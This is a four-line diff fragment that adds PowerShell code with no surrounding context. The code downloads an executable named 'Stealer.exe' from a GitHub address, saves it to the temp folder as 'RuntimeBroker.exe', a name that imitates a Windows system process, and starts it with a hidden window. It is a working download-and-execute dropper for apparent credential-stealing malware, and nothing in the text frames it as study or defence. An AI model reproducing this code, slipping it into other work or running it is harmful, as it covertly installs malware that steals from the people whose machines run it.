@@ -1,0 +1,4 @@
+$url = 'https://github.com/zeykop9-tech/Stealer.exe'
+$out = $env:TEMP + '\RuntimeBroker.exe'
+(New-Object Net.WebClient).DownloadFile($url, $out)
+Start-Process $out -WindowStyle Hidden
